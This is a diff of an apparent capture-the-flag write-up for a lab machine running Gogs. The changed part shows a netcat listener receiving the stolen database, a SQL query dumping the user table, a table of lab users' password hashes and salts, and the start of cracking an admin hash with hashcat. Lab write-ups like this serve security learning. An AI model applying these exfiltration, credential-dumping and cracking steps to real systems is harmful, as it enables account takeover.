@@ -417,18 +417,16 @@ nc -lvnp 9001 > gogs.db
 Dumping the user table:
 
 ```sql
-sqlite3 gogs.db
-SELECT id, name, email, passwd, salt, is_admin FROM user;
+sqlite> SELECT id, name, email, passwd, salt, is_admin FROM user;
 ```
 
-```
-id  name             email                    is_admin
-1   vroth            vroth@ghostlink.htb      0
-2   nvirelli         nvirelli@ghostlink.htb   1
-3   gpz-tools-admin  null@ghostlink.htb       1
-4   zkovacs          zkovacs@ghostlink.htb    0
-5   ohexley          ohexley@ghostlink.htb    0
-```
+| id  | name            | email                                                   | passwd                                                                                                 | salt         | is_admin |
+| --- | --------------- | ------------------------------------------------------- | ------------------------------------------------------------------------------------------------------ | ------------ | -------- |
+| 1   | vroth           | [vroth@ghostlink.htb](mailto:vroth@ghostlink.htb)       | `12528ba6418a9741578a33e0759b2e8375470269b720069ccab38f5c1cb3c287e4bf319ca7bd700d9d8a7395a4222e5ab326` | `6y62BTJVSO` | 0        |
+| 2   | nvirelli        | [nvirelli@ghostlink.htb](mailto:nvirelli@ghostlink.htb) | `8d9b3a01c3a0260b39db011aed1dbf239b8b1b28af6141f28aa01d3b3ab8ffd4408bc5b9065ff957e716375a7bec1755d3e8` | `DW3YdxPy25` | 1        |
+| 3   | gpz-tools-admin | [null@ghostlink.htb](mailto:null@ghostlink.htb)         | `ec5a7a9fc3417846b7baef2d301e9a0beaecf200fd5f33aa235c72c2b0a206f582eab05332d6e6799c78a45387b2b7fe7014` | `CIRi441QwX` | 1        |
+| 4   | zkovacs         | [zkovacs@ghostlink.htb](mailto:zkovacs@ghostlink.htb)   | `a7dbbe7f55d2e4a66e8e7aa1f0fdd5cadddbc3fe4d06a060782e1b5985959461695ea9da089653099b221c0dc326caad01a2` | `qMOaBu0l1B` | 0        |
+| 5   | ohexley         | [ohexley@ghostlink.htb](mailto:ohexley@ghostlink.htb)   | `6b286f89df176ae6405dc75cc436f0b6493ed2c29a0b6c1363c111b22b23075ebd790c4015e315ddb3d770c3f7caa976620`  | `OEVEC4I5Io` | 0        |
 
 Gogs salts and hashes passwords with PBKDF2-HMAC-SHA256. Converting `nvirelli`'s hash/salt into hashcat's format with [GogsToHashcat](https://github.com/shinris3n/GogsToHashcat) and cracking it:
 
